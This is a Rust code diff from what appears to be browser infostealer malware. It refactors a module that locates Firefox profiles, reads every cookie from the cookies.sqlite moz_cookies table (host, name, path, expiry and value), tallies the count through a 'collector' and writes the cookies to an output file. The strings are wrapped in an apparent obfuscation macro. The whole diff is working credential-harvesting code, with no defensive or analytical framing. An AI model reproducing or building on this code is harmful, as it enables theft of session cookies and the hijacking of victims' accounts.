@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
-use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
+use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, ExtractExt};
 use alloc::sync::Arc;
 use derive_new::new;
 use collector::{Browser, Collector};
@@ -31,7 +31,14 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
             &StorageFileSystem,
             |profile| profile / s!("cookies.sqlite"),
             s!("moz_cookies"),
-            extract_cookies_from_record,
+            Cookie::make_extractor((
+                MOZ_COOKIES_HOST,
+                MOZ_COOKIES_NAME,
+                MOZ_COOKIES_PATH,
+                MOZ_COOKIES_EXPIRY,
+                MOZ_COOKIES_VALUE,
+                |value| value.as_string()
+            )),
         ) else {
             return;
         };
@@ -39,22 +46,4 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
         collector.get_browser().increase_cookies_by(cookies.len());
         let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
     }
-}
-
-fn extract_cookies_from_record<R: TableRecord>(record: &R) -> Option<Cookie> {
-    let host_key = record.get_value(MOZ_COOKIES_HOST)?.as_string()?;
-    let name = record.get_value(MOZ_COOKIES_NAME)?.as_string()?;
-    let path = record.get_value(MOZ_COOKIES_PATH)?.as_string()?;
-    let expires = record
-        .get_value(MOZ_COOKIES_EXPIRY)?
-        .as_integer()?;
-    let value = record.get_value(MOZ_COOKIES_VALUE)?.as_string()?;
-
-    Some(Cookie {
-        host_key,
-        name,
-        value,
-        path,
-        expires_utc: expires,
-    })
 }
